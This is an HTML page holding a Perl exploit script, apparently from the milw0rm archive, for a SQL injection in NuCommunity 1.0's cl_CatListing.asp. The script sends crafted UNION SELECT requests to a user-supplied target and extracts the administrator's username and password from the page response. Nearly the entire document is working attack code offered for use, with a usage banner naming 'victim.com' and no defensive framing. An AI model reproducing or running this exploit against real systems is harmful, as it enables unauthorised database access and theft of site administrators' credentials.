<html><head><title>NuCommunity 1.0 (cl_CatListing.asp) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#[Script Name: NuCommunity 1.0 (cl_CatListing.asp) Remote SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(

use IO::Socket;
if(@ARGV &lt; 3){
print &quot;
[========================================================================
[//  NuCommunity 1.0 (cl_CatListing.asp) Remote SQL Injection Exploit
[//           Usage: exploit.pl [target] [path] [userid]
[//                   Example: exploit.pl victim.com / 1
[//                   Example: exploit.pl victim.com /path/ 1
[//                           Vuln&amp;Exp : ajann
[========================================================================
&quot;;
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = &quot;http://&quot;.$server;
$port = &quot;80&quot;;
$dir = $ARGV[1];
$file = &quot;cl_CatListing.asp?cl_cat_ID=&quot;;
$target = &quot;-1%20union%20select%200,0,0,admin_user%20from%20admin+where+admin_id%20like%20&quot;.$ARGV[2];
$target = $host.$dir.$file.$target;

$targettwo = &quot;-1%20union%20select%200,0,0,admin_password%20from%20admin+where+admin_id%20like%20&quot;.$ARGV[2];
$targettwo = $host.$dir.$file.$targettwo;

#Writing data to socket
print &quot;+**********************************************************************+\n&quot;;
print &quot;+ Trying to connect: $server\n&quot;;
$socket = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$server&quot;, PeerPort =&gt; &quot;$port&quot;) || die &quot;\n+ Connection failed...\n&quot;;
print $socket &quot;GET $target\n&quot;;
print $socket &quot;Host: $server\n&quot;;
print $socket &quot;Accept: */*\n&quot;;
print $socket &quot;Connection: close\n\n&quot;;
print &quot;+ Connected!...\n&quot;;
#Getting
while($answer = &lt;$socket&gt;) {
if ($answer =~ /t size=\&quot;2\&quot;&gt;(.*?)&lt;\/font&gt;/){ 
print &quot;+ Exploit succeed! Getting admin information.\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;+ Username: $1\n&quot;;

print &quot;+**********************************************************************+\n&quot;;
print &quot;+ Trying to connect for Password: $server\n&quot;;
$socket1 = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$server&quot;, PeerPort =&gt; &quot;$port&quot;) || die &quot;\n+ Connection failed...\n&quot;;
print $socket1 &quot;GET $targettwo\n&quot;;
print $socket1 &quot;Host: $server\n&quot;;
print $socket1 &quot;Accept: */*\n&quot;;
print $socket1 &quot;Connection: close\n\n&quot;;
print &quot;+ Connected!...\n&quot;;
#Getting
while($answer = &lt;$socket1&gt;) {
if ($answer =~ /t size=\&quot;2\&quot;&gt;(.*?)&lt;\/font&gt;/){ 
print &quot;+ Exploit succeed! Getting admin information.\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;+ Password: $1\n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit();
}


if ($answer =~ /Ad removed or not yet approved/) { 
print &quot;+ Exploit Failed : ( \n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}

if ($answer =~ /Internal Server Error/) {
print &quot;+ Exploit Failed : (  \n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}
 }
   } 
    }
print &quot;+ Exploit failed :(\n&quot;;
print &quot;+**********************************************************************+\n&quot;;

# milw0rm.com [2006-11-11]</pre></html>